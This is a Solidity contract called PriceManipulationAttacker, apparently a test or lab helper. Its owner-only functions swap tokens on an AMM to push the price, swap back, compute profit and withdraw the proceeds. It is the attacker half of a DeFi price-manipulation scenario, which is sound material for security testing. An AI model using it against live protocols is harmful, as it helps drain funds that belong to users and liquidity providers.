// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../interfaces/IERC20Minimal.sol";
import "../../interfaces/IDexMinimal.sol";

contract PriceManipulationAttacker {
    address public owner;
    uint256 private totalInvested;
    uint256 private totalReturned;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function swapToManipulatePrice(address amm, address tokenIn, uint256 amountIn)
        external
        onlyOwner
    {
        IERC20Minimal token = IERC20Minimal(tokenIn);
        token.approve(amm, amountIn);
        uint256 received = IDexMinimal(amm).swap(tokenIn, amountIn);
        totalInvested += amountIn;
        totalReturned += received;
    }

    function swapBack(address amm, address tokenIn, uint256 amountIn) external onlyOwner {
        IERC20Minimal token = IERC20Minimal(tokenIn);
        token.approve(amm, amountIn);
        uint256 received = IDexMinimal(amm).swap(tokenIn, amountIn);
        totalReturned += received;
    }

    function getProfits() external view returns (uint256) {
        if (totalReturned > totalInvested) {
            return totalReturned - totalInvested;
        }
        return 0;
    }

    function withdrawToken(address token, uint256 amount) external onlyOwner {
        IERC20Minimal(token).transfer(owner, amount);
    }
}
